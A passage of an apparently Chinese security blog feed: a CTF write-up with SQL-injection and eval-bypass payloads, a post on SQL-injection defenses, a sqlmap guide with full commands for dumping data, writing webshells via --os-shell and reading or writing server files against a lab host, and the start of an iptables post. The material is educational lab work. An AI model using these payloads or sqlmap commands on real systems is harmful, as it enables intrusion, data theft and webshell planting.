若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results</span><br></pre></td></tr></table></figure></p><p>也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; 内部操作字符集</span><br></pre></td></tr></table></figure><p>而且p神说的在MySQL里面的utf-8是阉割版，最长只支持三个字节，<br>如果你需要Mysql支持四字节的utf-8，可以使用utf8mb4编码。<br>但是这个点跟这题无关，这个点用在让数据库误认为该字母不存在直接舍弃掉的情况</p><p>第二个点是<br>mysql 有两个支持 unicode 的 character set:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。</span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure><p>而在本题目中，sql文件中显示</p><p><code>ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></p><p>很显然这里是utf8，而我们一般数据库默认使用的是utf8_general_ci，而ci是指case insensitive的缩写，即大小写不敏感</p><p>这样也表明了为什么平常我们在cmd命令行下写数据库命令不区分大小写了</p><p>根据方方土学长所说的，这种模式由于diacritic ordering的排序问题使得读音符号最后被认定为英文字母</p><p>也就是对于utf8_general_ci，认为以下样例是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ä = A</span><br><span class="line">Ö = O</span><br><span class="line">Ü = U</span><br></pre></td></tr></table></figure><p>而且还给出了这个超级腻害的表<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>表格上方是 unicode 编码，下方是 utf8 编码</p><p>然后构造一下admin还有guest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin: %C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1</span><br><span class="line">guest: %C4%9D%C3%B9%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$vps_ip = <span class="string">'你的vps地址'</span>;</span><br><span class="line">$time = time();</span><br><span class="line">    $url = <span class="string">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1'),('%C4%9D%C3%B9%C3%A8%C5%9B%C5%A3_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span>;</span><br><span class="line">    <span class="keyword">echo</span> $url;</span><br></pre></td></tr></table></figure><p>然后在你的vps上再curl一下就得到flag了</p><p><a href="https://imgchr.com/i/P2t4AI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2t4AI.md.png" alt="P2t4AI.md.png"></a></p><h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要利用的是if条件里面的eval函数直接输出flag,前提是这里过滤十分强大，把所有可以执行的函数全部过滤，这时候只能利用开发的一个知识，就是<code>&lt;?=$flag?&gt;</code>,可以直接把flag里面的内容直接输出来，这东西我也是在学YII框架的时候学会的。<br>可以直接看一下文档里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>这相当于说这是一个echo的缩写版<br><a href="https://imgchr.com/i/P2tbjg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2tbjg.md.png" alt="P2tbjg.md.png"></a><br>另外呢这两句话表明了php5.4以后都存在这样的缩写形式<br>我们现在还要考虑的是如何绕过长度的问题以及不要在payload里面存在flag这个词，所以最后的payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=&apos;blag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure><p>这里前面的<code>?&gt;</code>的是利用了html里面的嵌套PHP的语法，同时也为了后面的<code>&lt;?=?&gt;</code>可以顺利执行，中间的<code>1</code>就是为了满足<code>strlen</code>这个函数从而执行下面的代码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.IP地址可以用ip2long这个函数尝试去绕过<br>2.回顾了科学计数法还有这个指数形式在bypass方面的绕过<br>3.parse_url()这个函数的几个小trick，分别是对于特殊字符会替换成_,以及在///的情况下会使后面的东西忽略从而导致绕过<br>4.关于注入这东西，灵活一些，别太死板，除了一些特殊的方法绕过以外，还可以考虑字符集(这里包括16进制)<br>5.eval函数里面的执行文件操作的函数都被过滤了，可以使用缩写输出之类<br>6.正则匹配注意一下匹配\的写法应该是四个|\\|,而且对于正则的规则以^开头$结尾的，可以%0a去bypass<br>7.还有飘零大哥的思路，代码审计拿来可能是SQL注入还有逻辑漏洞这也是很骚气的，22333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站&lt;a href=&quot;http://solveme.peng.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://solveme.peng.kr&lt;/a&gt; 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="代码审计" scheme="0verwatch.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SQL注入防御手段</title>
    <link href="0verwatch.top/2018/08/02/sql-inject-protect/"/>
    <id>0verwatch.top/2018/08/02/sql-inject-protect/</id>
    <published>2018-08-02T15:08:29.000Z</published>
    <updated>2018-08-14T14:44:04.855Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sql语句预编译"><a href="#sql语句预编译" class="headerlink" title="sql语句预编译"></a>sql语句预编译</h3><p>例如:<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>这里采用了<code>PreparedStatement</code>，就会将sql语句<code>预先编译</code>好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 <code>select ,from ,where ,and, or ,order by</code> 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入</p><p>讲一下另外一个预编译，就是用PDO，这里就推荐几篇文章自己看一下，简单说一下就是原理跟上面的差不多，把执行语句和变量分开，变量分别绑定，分别传参，从而阻止了注入，只是底层不太明了，自己真菜。。<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>预编译方法就最有效！！也是如今市场上最流行的方式了</p><h3 id="检查变量数据类型和格式"><a href="#检查变量数据类型和格式" class="headerlink" title="检查变量数据类型和格式"></a>检查变量数据类型和格式</h3><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;‘;</span></span><br></pre></td></tr></table></figure><p>这段语句是为了保证了id是数字类型，checkid是一个<code>自定义</code>的函数，但是千万别直接里面写一个<code>is_numeric</code>就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的，这个还是少用吧，毕竟自写函数就像是写黑名单，肯定会有纰漏的</p><h3 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h3><p>这个方法也相当于<code>黑名单</code>，还是少用为好，一般有纰漏就可以去绕过的了</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> boolean sql_inj(String str) </span><br><span class="line">&#123; </span><br><span class="line">String inj_str = “’|<span class="keyword">and</span>|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|char|<span class="keyword">declare</span>|;|<span class="keyword">or</span>|-|+|,”; </span><br><span class="line">String inj_stra[] = split(inj_str,”|”); </span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="keyword">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>黑名单只能追求全面去避免SQL注入了</p><h3 id="转译特殊符号"><a href="#转译特殊符号" class="headerlink" title="转译特殊符号"></a>转译特殊符号</h3><p>例如:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>这里就是利用了<code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到sql注入攻击的效果。一般在CTF题目里面如果我看到这个函数的话，我会预测有75%可能不是SQL注入，先去看看其他点是否存在漏洞</p><h3 id="从中间件配置上防止SQL注入"><a href="#从中间件配置上防止SQL注入" class="headerlink" title="从中间件配置上防止SQL注入"></a>从中间件配置上防止SQL注入</h3><p>通过启用php.ini配置文件中的<code>magic_quote_gpc (魔术字符)</code>，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。开启<code>magic_quote_gpc=on</code>之后，能实现<code>addslshes()</code>和<code>stripslashes()</code>这两个函数的功能，这就从很大程度上防止了sql注入。<code>PHP 5.4</code> 之前 PHP 指令 <code>magic_quotes_gpc</code> 默认是 <code>on</code>， 实际上所有的 GET、POST 和 COOKIE 数据都用被 <code>addslashes()</code> 了。 不要对已经被 <code>magic_quotes_gpc</code> 转义过的字符串使用 <code>addslashes()</code>，因为这样会导致<code>双层转义</code>。 遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测<br>但是只开启<code>magic_quote_gpc</code> ，对防止sql注入是远远不够的。<br>例如以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>在这条sql语句中并没有单引号的保护，攻击者既不需要闭合单引号也不需要注释单引号，所以gpc开启对sql注入攻击的防范并没有作用。所以说变量还是要用引号包住才好，别直接就赋值了。。。</p><h3 id="通过安全waf去防御"><a href="#通过安全waf去防御" class="headerlink" title="通过安全waf去防御"></a>通过安全waf去防御</h3><p>过安全waf达到一定程度防御,软件层面的不多说。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>总的来说，现在很多网站多不会再使用字符串拼接去查找数据库里面的内容了，大多数现在使用的是预编译，除了那些荒废的网站以及CTF题目里面会使用，那是不是说以后挖洞挖SQL注入的就比较难了233333。。。我还是太年轻了</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sql语句预编译&quot;&gt;&lt;a href=&quot;#sql语句预编译&quot; class=&quot;headerlink&quot; title=&quot;sql语句预编译&quot;&gt;&lt;/a&gt;sql语句预编译&lt;/h3&gt;&lt;p&gt;例如:
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap 使用方法小结</title>
    <link href="0verwatch.top/2018/08/02/sqlmap-usage/"/>
    <id>0verwatch.top/2018/08/02/sqlmap-usage/</id>
    <published>2018-08-02T14:05:38.000Z</published>
    <updated>2018-08-02T15:22:31.416Z</updated>
    
    <content type="html"><![CDATA[<p>平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西<a id="more"></a></p><p>前置知识<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">--dbs 所有数据库</span><br><span class="line">--current-db 网站当前数据库</span><br><span class="line">--users 所有数据库用户</span><br><span class="line">--current-user 当前数据库用户</span><br><span class="line">--random-agent 构造随机user-agent</span><br><span class="line">--passwords 数据库密码</span><br><span class="line">--proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒</span><br><span class="line">--threads=                       使用多少线程</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> 这个命令有时候决定了你是否可以在服务器下进行写的操作，这个很重要，是否有写的权限，代表你是否可以在服务器上面写入一句话木马</p><h3 id="利用sqlmap进行POST注入"><a href="#利用sqlmap进行POST注入" class="headerlink" title="利用sqlmap进行POST注入"></a>利用sqlmap进行POST注入</h3><p>先利用bp去抓一个包，直接发送包里面的内容保存到一个文件里面，然后用<code>-r</code>参数去实现它就好<br>例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql</span><br><span class="line">```    </span><br><span class="line">指定username参数，-dbms指定了某种数据库，这句话指定的是mysql数据库，-p指定的是参数，不指定的话每一个参数他都会尝试</span><br><span class="line">注意这句话已经不像平常那样需要`-u`参数了，直接`-r`参数即可，因为报文里面已经含有了含有应有的各种条件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 利用sqlmap进行需要登陆的注入</span><br><span class="line">可以跟上面进行post注入的一样，直接`-r`参数带上你的抓包文件路径，既然是需要登录的注入，那么报文里面肯定是要有`cookie`的</span><br><span class="line">我们还可以利用<span class="comment">--cookie参数注入，例如: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>这里面的cookie参数可以抓包获得</p><h3 id="利用sqlmap进行交互式写shell"><a href="#利用sqlmap进行交互式写shell" class="headerlink" title="利用sqlmap进行交互式写shell"></a>利用sqlmap进行交互式写shell</h3><p>这个要利用sqlmap写shell的话前提需要获取网站的绝对路径，而且必须叙是root权限</p><p>使用burpsuite进行抓包，获取cookie。判断用户是否为dba，输入命令：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  输入命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  脚本类型为PHP，所以输入4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   输入第二步得到的路径，这样就可以在里面写相关命令了<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" alt="P0gu9K.png"><br>这时候会在绝对路径下写入2个shell，一个用来执行命令的，另一个是用来上传的，其中上传的文件名为tmpujhum.php，这个上传的文件可以去上传小马然后连接即可，这里我们注意一下，为什么会出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志，后面也会提一下。他这个写进admin的方式有可能会导致利用sqlmap写文件的时候小马文件会出现乱码。猜测是写文件的方式导致了文件的乱码，我们都知道写文件的方式要么就是ASCII要么是二进制文件流方式去实现。</p><h3 id="利用sqlmap辅助手工注入"><a href="#利用sqlmap辅助手工注入" class="headerlink" title="利用sqlmap辅助手工注入"></a>利用sqlmap辅助手工注入</h3><p>其实这个就是介绍了在发现注入点之后，怎么在sqlmap里面执行SQL语句，继续用上面的例子，改一下就是这样子的，但前提我们也是要发现数据点<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>这样就是相当于运行对应的SQL语句了。但是其实这样执行的话每一次都会对网站注入一遍，效率就比较低.<br>可以换一个方式，把<code>--sql-query</code>改为<code>--sql-shell</code>,这样一来就相当于平常我们执行SQL语句的那个cmd命令界面一样。写一条语句就直接执行一条，省去了注入的过程。</p><h3 id="利用sqlmap进行文件读写"><a href="#利用sqlmap进行文件读写" class="headerlink" title="利用sqlmap进行文件读写"></a>利用sqlmap进行文件读写</h3><p>这里可以写文件的话前提必须有<br>判断是否为<code>dba/root用户</code>，爆出了网站的绝对路径，有一个可写目录，也是用上面的案例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>成功读取了<code>php.ini</code>文件，并返回了路径。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> 打开如下图所示：<br>      这里的文件我们可以去sqlmap的output里面查看，也就是对应的用户文件夹里面</p><p>在服务器端写入文件<br>      输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  这里的意思就是将本地<code>C:\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>打开对应文件的网站路径如下图：<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>这里又出现了admin admin了，就是sqlmap用来确认是否写成功的标志，因为在写文件的过程中他会问是否验证，它就会以这个标志来判断啦。</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平常的使用GET方法像–tables –columns -T -D –dbs –dump 啥的就不说了，只是博客几天不发，空着不好，还是得写写东西
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux防火墙学习</title>
    <link href="0verwatch.top/2018/07/29/Linux-FW/"/>
    <id>0verwatch.top/2018/07/29/Linux-FW/</id>
    <published>2018-07-29T15:32:03.000Z</published>
    <updated>2018-08-05T11:54:35.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux下<code>iptables</code>的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，<a id="more"></a>现在我要更正一下自己的思路，路由器不单单实现转发功能，我现在还把他看成一台可以实现过滤功能的电脑，这样就对它所连接的LAN有保护作用了，但现在一般对于网络防火墙而言很少再使用<code>iptables</code>了，现在一般都用一些大型厂商提供的防火墙。比如华3，深信服之类的，说白了就是牛逼了一点的电脑，但是对于一台服务器而言还是可以设置规则来防止别人拿下服务器的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>netfilter</code>    ：位于Linux内核中的包过滤功能体系，称为Linux防火墙的“内核态”<br><code>iptables</code>：位于/sbin/iptables，用来管理防火墙规则的工具，称为Linux防火墙的“用户态”</p><p>—— 上述2种称呼都可以表示Linux防火墙<br>其实用户层面使用iptables也是去调用内核里面的netfilter，这是操作系统里面的知识就不多说了</p><h3 id="Linux查看防火墙状态"><a href="#Linux查看防火墙状态" class="headerlink" title="Linux查看防火墙状态"></a>Linux查看防火墙状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start 启动防火墙</span><br><span class="line">service iptables status 查看防火墙状态，还可以使用这样一条命令iptables -L --line-numbers查看较为详细的命令</span><br><span class="line">service iptables stop 停止服务</span><br></pre></td></tr></table></figure><p>如果是阿里云的主机好像没有这个服务，他是直接在网页上让你设置防火墙，这是我自己的阿里云主机，命令行界面不能设置，但是在网页端可已自行控制端口的开放以及各种规则<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="包过滤的工作层次"><a href="#包过滤的工作层次" class="headerlink" title="包过滤的工作层次"></a>包过滤的工作层次</h3><p>主要实现在网络层也就是对IP数据包的处理上，详细一点就是对ip地址以及端口做处理<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>下面是些先行知识，关于iptables的链表结构</p><h3 id="规则链"><a href="#规则链" class="headerlink" title="规则链"></a>规则链</h3><p>规则的作用：对数据包进行过滤或处理<br>链的作用：容纳各种防火墙规则<br>链的分类依据：处理数据包的不同时机</p><p>默认包括5种规则链<br><code>INPUT</code>：处理入站数据包<br><code>OUTPUT</code>：处理出站数据包<br><code>FORWARD</code>：处理转发数据包<br><code>POSTROUTING</code>链：在进行路由选择后处理数据包<br><code>PREROUTING</code>链：在进行路由选择前处理数据包</p><p>上面这5种规则，在现实生活中一般不是全都是使用</p><h3 id="规则表"><a href="#规则表" class="headerlink" 